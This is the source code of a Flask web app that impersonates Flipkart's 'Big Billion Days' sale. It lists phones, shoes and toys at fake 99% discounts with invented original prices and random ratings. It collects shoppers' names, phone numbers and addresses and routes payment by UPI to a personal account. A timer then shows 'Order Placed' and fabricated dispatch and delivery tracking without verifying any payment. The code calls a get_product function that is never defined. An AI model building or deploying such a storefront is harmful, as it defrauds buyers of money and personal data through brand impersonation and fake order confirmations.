
from flask import Flask, render_template_string, request, session, redirect, url_for
import random
import datetime

app = Flask(__name__)
app.secret_key = 'flipkart_final_public_release_v10'

# ==========================================
# 1. SETTINGS (UPI ID)
# ==========================================
MY_UPI_ID = "9653314458@naviaxis"
MY_NAME = "Apni Dukaan"

# ==========================================
# 2. DATABASE & INVENTORY
# ==========================================
products = []
orders_db = []
next_id = 1

def add_item(name, category, keyword, price_type="normal"):
    global next_id
    
    # --- PRICING LOGIC (As per your request) ---
    if name.startswith("iPhone") or name.startswith("Samsung Ultra"):
        price = 1500
    elif category == "Mobile":
        price = random.choice([49, 99, 999])
    elif category == "Watch":
        price = random.choice([30, 49])
    elif category == "Shoes":
        price = 50
    elif category in ["Toys", "Gadget", "Kitchen"]:
        price = 1
    else:
        price = random.choice([49, 99, 199])

    # Fake MRP (Always high to show 99% off)
    original_price = price * 100 
    
    # Dynamic Image
    img = f"https://image.pollinations.ai/prompt/{keyword}?width=300&height=300&nologo=true&seed={next_id}"

    products.append({
        'id': next_id,
        'name': name,
        'price': price,
        'original_price': original_price,
        'discount': 99, # Sab par 99% OFF
        'category': category,
        'image': img,
        'rating': round(random.uniform(4.0, 5.0), 1),
        'rating_count': f"{random.randint(1000, 50000)}",
        'specs': {"Seller": "RetailNet", "Warranty": "1 Year", "Return": "7 Days"}
    })
    next_id += 1

# --- FILLING THE STORE (Bahut sara maal) ---

# 1. Phones (High Demand)
for _ in range(5): add_item("iPhone 15 Pro Max", "Mobile", "iphone 15 pro titanium")
for _ in range(5): add_item("Samsung S24 Ultra", "Mobile", "samsung s24 ultra titanium")
for _ in range(5): add_item("Vivo V30 Pro", "Mobile", "vivo smartphone blue")
for _ in range(5): add_item("Oppo Reno 11", "Mobile", "oppo reno phone")
for _ in range(5): add_item("Redmi Note 13", "Mobile", "redmi note phone")

# 2. Watches (Cheap)
for _ in range(8): add_item("Digital Smart Watch", "Watch", "digital smart watch black")
for _ in range(5): add_item("Luxury Analog Watch", "Watch", "golden analog watch men")

# 3. Shoes (Rs 50)
for _ in range(10): add_item("Running Sports Shoe", "Shoes", "nike running shoes")
for _ in range(5): add_item("Casual Sneakers", "Shoes", "white sneakers fashion")

# 4. Toys & Gadgets (Rs 1 Loot)
for _ in range(5): add_item("RC Car Toy", "Toys", "remote control car toy")
for _ in range(5): add_item("Dancing Cactus", "Toys", "dancing cactus toy")
for _ in range(5): add_item("USB Light Gadget", "Gadget", "usb led light flexible")
for _ in range(5): add_item("Key Chain Gadget", "Gadget", "avengers key chain metal")

# 5. Kitchen & Home (Rs 1)
for _ in range(5): add_item("Vegetable Chopper", "Kitchen", "vegetable chopper plastic")
for _ in range(5): add_item("Steel Knife Set", "Kitchen", "kitchen knife set steel")
for _ in range(5): add_item("Water Bottle", "Kitchen", "gym water bottle black")

# 6. Beauty (Makeup)
for _ in range(10): add_item("Matte Lipstick Set", "Beauty", "red lipstick set box")
for _ in range(5): add_item("Eyeliner Kit", "Beauty", "eyeliner makeup kit")


# ==========================================
# 3. HTML TEMPLATE
# ==========================================
HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Flipkart Big Billion Days</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        body { font-family: Roboto, sans-serif; margin: 0; background: #f1f3f6; padding-bottom: 60px; }
        a { text-decoration: none; color: inherit; }
        
        /* NAVBAR */
        .navbar { background: #2874f0; padding: 10px; position: sticky; top: 0; z-index: 1000; display: flex; align-items: center; gap: 10px; box-shadow: 0 2px 4px rgba(0,0,0,0.2); }
        .logo { color: white; font-weight: bold; font-style: italic; font-size: 19px; flex-grow: 1; }
        .search-container { background: white; width: 100%; padding: 8px; margin-top: 0px; }
        .search-bar { background: #fff; border-radius: 2px; display: flex; align-items: center; border: 1px solid #ddd; padding: 5px; }
        .search-bar input { border: none; outline: none; width: 100%; font-size: 14px; margin-left: 10px; }
        
        /* SIDEBAR */
        .sidebar { position: fixed; top: 0; left: -280px; width: 280px; height: 100%; background: white; z-index: 2000; transition: 0.3s; box-shadow: 2px 0 10px rgba(0,0,0,0.3); }
        .sidebar.active { left: 0; }
        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 1500; display: none; }
        .overlay.active { display: block; }
        .side-header { background: #2874f0; padding: 20px; color: white; display: flex; align-items: center; gap: 10px; }
        .menu-item { padding: 15px; border-bottom: 1px solid #eee; display: flex; gap: 15px; align-items: center; color: #333; }

        /* PRODUCT GRID */
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 4px; padding: 4px; }
        .card { background: white; padding: 8px; border: 1px solid #f0f0f0; position: relative; }
        .card img { width: 100%; height: 140px; object-fit: contain; }
        .title { font-size: 13px; color: #212121; margin-top: 5px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .price { font-size: 16px; font-weight: bold; margin-top: 2px; }
        .off { color: #388e3c; font-size: 12px; font-weight: bold; }
        
        /* ROADMAP TRACKING */
        .roadmap-box { background: white; padding: 20px; margin: 10px; border-radius: 4px; border: 1px solid #ddd; }
        .step { display: flex; gap: 15px; padding-bottom: 20px; position: relative; }
        .step:not(:last-child)::after { content: ''; position: absolute; left: 14px; top: 25px; bottom: 0; width: 2px; background: #388e3c; }
        .circle { width: 30px; height: 30px; border-radius: 50%; background: #388e3c; color: white; display: flex; align-items: center; justify-content: center; z-index: 2; }
        .text h4 { margin: 0; font-size: 14px; }
        .text p { margin: 2px 0 0; font-size: 11px; color: #878787; }
        
        /* BUTTONS */
        .btn-footer { position: fixed; bottom: 0; left: 0; width: 100%; display: flex; z-index: 999; }
        .btn { width: 50%; padding: 15px; border: none; font-weight: bold; cursor: pointer; color: white; text-align: center; }
        .btn-white { background: white; color: black; border-top: 1px solid #ddd; }
        .btn-yellow { background: #ff9f00; }
        .btn-orange { background: #fb641b; }
        
        /* FORM */
        .form-box { background: white; padding: 20px; min-height: 100vh; }
        .inp { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 2px; box-sizing: border-box; }
        .full-btn { width: 100%; padding: 12px; background: #fb641b; color: white; border: none; font-weight: bold; cursor: pointer; }

    </style>
</head>
<body>

    <div class="overlay" onclick="toggleMenu()"></div>
    <div class="sidebar" id="sidebar">
        <div class="side-header">
            <i class="fas fa-user-circle" style="font-size:30px;"></i>
            <div>
                {% if session.get('user') %} {{ session.user.name }} {% else %} Login & Signup {% endif %}
            </div>
        </div>
        <a href="/" class="menu-item"><i class="fas fa-home"></i> Home</a>
        <a href="/my_orders" class="menu-item"><i class="fas fa-box"></i> My Orders</a>
        <a href="/cart" class="menu-item"><i class="fas fa-shopping-cart"></i> Cart</a>
        {% if session.get('user') %} <a href="/logout" class="menu-item" style="color:red;">Logout</a> {% endif %}
    </div>

    <div class="navbar">
        <i class="fas fa-bars" style="color:white; font-size:20px;" onclick="toggleMenu()"></i>
        <div class="logo">Flipkart<span>+</span></div>
        <a href="/cart" style="color:white;"><i class="fas fa-shopping-cart"></i></a>
        {% if not session.get('user') %} <a href="/login" style="color:white; font-size:14px; font-weight:bold;">Login</a> {% endif %}
    </div>

    {% if page == 'home' %}
        <div class="search-container">
            <form action="/" method="get" class="search-bar">
                <i class="fas fa-search" style="color:#888;"></i>
                <input type="text" name="q" placeholder="Search for Products, Brands and More" value="{{ request.args.get('q', '') }}">
            </form>
        </div>

        <div style="background: linear-gradient(90deg, #ff0000, #ff5500); padding: 10px; color: white; display: flex; justify-content: space-between;">
            <div style="font-weight:bold;">🔥 99% OFF SALE LIVE</div>
            <div style="background:white; color:red; padding:2px 5px; font-weight:bold; border-radius:2px;">11 : 59 : 30</div>
        </div>

        <div class="grid">
            {% if products|length == 0 %} <div style="padding:20px;">No Products Found</div> {% endif %}
            {% for p in products %}
            <a href="/product/{{ p.id }}" class="card">
                <div style="position:absolute; top:5px; left:5px; background:#388e3c; color:white; font-size:10px; padding:2px 5px;">{{ p.discount }}% Off</div>
                <img src="{{ p.image }}">
                <div class="title">{{ p.name }}</div>
                <div class="price">₹{{ p.price }}</div>
                <div style="text-decoration:line-through; font-size:12px; color:#878787;">₹{{ p.original_price }}</div>
                <div style="font-size:10px; color:green;">Free Delivery</div>
            </a>
            {% endfor %}
        </div>

    {% elif page == 'detail' %}
        <div style="background:white; padding-bottom:60px;">
            <div style="text-align:center; padding:20px; border-bottom:1px solid #f0f0f0;">
                <img src="{{ product.image }}" style="height:300px; max-width:100%;">
            </div>
            <div style="padding:15px;">
                <div style="color:#878787; font-size:12px;">{{ product.category }}</div>
                <div style="font-size:18px;">{{ product.name }}</div>
                <div style="margin:5px 0;">
                    <span style="background:#388e3c; color:white; padding:2px 5px; border-radius:3px; font-size:12px;">{{ product.rating }} ★</span>
                    <span style="color:#878787; font-size:12px;">({{ product.rating_count }} ratings)</span>
                </div>
                <div class="price" style="font-size:24px;">₹{{ product.price }}</div>
                <div style="color:#388e3c; font-size:14px; font-weight:bold;">{{ product.discount }}% off</div>
                
                <div style="margin-top:20px; border:1px solid #eee; padding:10px; border-radius:4px;">
                    <div style="font-size:14px; font-weight:bold;">Available Offers</div>
                    <li style="font-size:12px; margin-top:5px;">5% Cashback on Flipkart Axis Bank Card</li>
                    <li style="font-size:12px; margin-top:5px;">Special Price: Get extra 99% off (price inclusive of discount)</li>
                </div>
            </div>
        </div>
        
        <div class="btn-footer">
            <button class="btn btn-white" onclick="alert('Added to Cart')">ADD TO CART</button>
            <form action="/buy_now/{{ product.id }}" method="post" style="width:50%;">
                <button class="btn btn-yellow" style="width:100%;">BUY NOW</button>
            </form>
        </div>

    {% elif page == 'login' %}
        <div class="form-box">
            <h2 style="color:#2874f0;">Login</h2>
            <p style="color:#878787; font-size:12px;">Get access to your Orders, Wishlist and Recommendations</p>
            <form action="/login" method="post" style="margin-top:20px;">
                <input type="text" name="name" class="inp" placeholder="Enter Name" required>
                <input type="number" name="phone" class="inp" placeholder="Enter Mobile Number" required>
                <button class="full-btn">Continue</button>
            </form>
        </div>

    {% elif page == 'address' %}
        <div class="form-box">
            <h2 style="color:#2874f0;">Delivery Address</h2>
            <form action="/confirm_order" method="post">
                <input type="text" name="pincode" class="inp" placeholder="Pincode" required>
                <input type="text" name="city" class="inp" placeholder="City / State" required>
                <textarea name="addr" class="inp" rows="3" placeholder="House No, Building Name" required></textarea>
                <button class="full-btn">Save Address</button>
            </form>
        </div>

    {% elif page == 'payment' %}
        <div class="form-box">
            <h2>Payment</h2>
            <div style="padding:15px; border:1px solid #ddd; border-radius:4px; margin-bottom:20px;">
                <input type="radio" checked> <b>UPI (PhonePe / GPay)</b>
            </div>
            
            <a href="upi://pay?pa={{ upi_id }}&pn={{ upi_name }}&am={{ total }}&cu=INR" 
               class="full-btn" style="text-align:center; display:block; text-decoration:none;" onclick="startPay()">
               Pay ₹{{ total }} via App
            </a>
            
            <form action="/success" method="post" id="autoForm" style="display:none;"></form>
            <div id="loader" style="display:none; text-align:center; margin-top:20px;">
                <i class="fas fa-spinner fa-spin" style="font-size:30px; color:#2874f0;"></i>
                <p>Processing Payment...</p>
            </div>
        </div>
        <script>
            function startPay() {
                document.getElementById('loader').style.display = 'block';
                setTimeout(() => document.getElementById('autoForm').submit(), 5000);
            }
        </script>

    {% elif page == 'success' %}
        <div style="background:#f1f3f6; min-height:100vh; padding:10px;">
            <div style="background:white; padding:20px; text-align:center; margin-bottom:10px;">
                <i class="fas fa-check-circle" style="font-size:50px; color:#388e3c;"></i>
                <h2 style="margin:10px 0;">Order Placed!</h2>
                <p style="color:#878787;">Order ID: #{{ order_id }}</p>
            </div>
            
            <div class="roadmap-box">
                <div class="step">
                    <div class="circle"><i class="fas fa-check"></i></div>
                    <div class="text"><h4>Order Accepted</h4><p>{{ date }}</p></div>
                </div>
                <div class="step">
                    <div class="circle"><i class="fas fa-box"></i></div>
                    <div class="text"><h4>Supply Dispatched</h4><p>Seller has packed your item</p></div>
                </div>
                <div class="step">
                    <div class="circle"><i class="fas fa-warehouse"></i></div>
                    <div class="text"><h4>Reached Nearest Hub</h4><p>Your city hub</p></div>
                </div>
                <div class="step">
                    <div class="circle" style="background:#fff; border:2px solid #388e3c; color:#388e3c;"><i class="fas fa-motorcycle"></i></div>
                    <div class="text"><h4>Out for Delivery</h4><p>Expected by {{ delivery_date }}</p></div>
                </div>
            </div>
            
            <a href="/" class="full-btn" style="text-align:center; display:block;">Shop More</a>
        </div>

    {% elif page == 'orders' %}
        <div style="background:white; min-height:100vh;">
            <div style="padding:15px; border-bottom:1px solid #eee;"><h3>My Orders</h3></div>
            {% for o in orders %}
            <div style="padding:15px; border-bottom:1px solid #f0f0f0;">
                <div style="font-weight:bold;">{{ o.item }}</div>
                <div style="display:flex; justify-content:space-between; margin-top:5px;">
                    <span style="font-weight:bold;">₹{{ o.amount }}</span>
                    <span style="color:#388e3c;">● Arriving on {{ o.delivery }}</span>
                </div>
                <a href="/track/{{ o.id }}" style="display:block; margin-top:10px; color:#2874f0; font-size:13px; font-weight:bold;">Track Order ></a>
            </div>
            {% endfor %}
        </div>

    {% endif %}

    <script>
        function toggleMenu() {
            document.getElementById('sidebar').classList.toggle('active');
            document.querySelector('.overlay').classList.toggle('active');
        }
    </script>
</body>
</html>
"""

# ==========================================
# 4. BACKEND LOGIC
# ==========================================
@app.route('/')
def home():
    q = request.args.get('q', '').lower()
    filtered = products
    if q: filtered = [p for p in products if q in p['name'].lower() or q in p['category'].lower()]
    return render_template_string(HTML, page='home', products=filtered)

@app.route('/product/<int:id>')
def product_detail(id):
    p = get_product(id)
    return render_template_string(HTML, page='detail', product=p)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        session['user'] = {'name': request.form['name'], 'phone': request.form['phone']}
        return redirect(session.get('next', '/'))
    return render_template_string(HTML, page='login')

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/')

@app.route('/buy_now/<int:id>', methods=['POST'])
def buy_now(id):
    session['checkout_item'] = id
    if not session.get('user'):
        session['next'] = '/address'
        return redirect('/login')
    return redirect('/address')

@app.route('/address', methods=['GET', 'POST'])
def address():
    if request.method == 'POST': return redirect('/payment')
    return render_template_string(HTML, page='address')

@app.route('/confirm_order', methods=['POST'])
def confirm_order(): return redirect('/payment')

@app.route('/payment')
def payment():
    p = get_product(session.get('checkout_item'))
    return render_template_string(HTML, page='payment', total=p['price'], upi_id=MY_UPI_ID, upi_name=MY_NAME)

@app.route('/success', methods=['POST'])
def success():
    p = get_product(session.get('checkout_item'))
    oid = random.randint(100000, 999999)
    today = datetime.datetime.now().strftime("%d %b")
    delivery = (datetime.datetime.now() + datetime.timedelta(days=4)).strftime("%d %b")
    
    if 'orders' not in session: session['orders'] = []
    orders = session['orders']
    orders.insert(0, {'id': oid, 'item': p['name'], 'amount': p['price'], 'date': today, 'delivery': delivery})
    session['orders'] = orders
    
    return render_template_string(HTML, page='success', order_id=oid, date=today, delivery_date=delivery)

@app.route('/my_orders')
def my_orders():
    if not session.get('user'): return redirect('/login')
    return render_template_string(HTML, page='orders', orders=session.get('orders', []))

@app.route('/track/<int:oid>')
def track(oid):
    # Tracking page logic reusing Success Template
    order = next((o for o in session.get('orders', []) if o['id'] == oid), None)
    if not order: return "Order Not Found"
    return render_template_string(HTML, page='success', order_id=oid, date=order['date'], delivery_date=order['delivery'])

@app.route('/cart')
def cart():
    # Basic cart placeholder to prevent Not Found error
    return render_template_string(HTML, page='orders', orders=[]) 

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
